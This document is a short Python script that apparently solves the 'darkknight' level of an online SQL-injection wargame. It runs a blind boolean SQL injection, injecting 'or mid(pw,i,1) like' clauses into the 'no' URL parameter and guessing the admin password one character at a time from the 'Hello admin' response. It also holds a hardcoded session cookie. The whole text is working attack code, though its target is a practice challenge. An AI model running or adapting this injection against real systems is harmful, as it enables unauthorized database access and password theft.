import requests
import string

pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1&no="
cookies = {'PHPSESSID':'di7sq95615k17gofpq7l55mqvf'}
for i in range(1,9):
    url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1&no="
    for j in a:
        url="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1&no=1 or mid(pw,"+str(i)+',1) like "'+str(j)+'"-- - '
        res=requests.get(url,cookies=cookies)
        res=res.text
        print(j)
        if "Hello admin" in res:
            pw+=j
            print("%d : %c" % (i,j))
            break
        else: pass
    
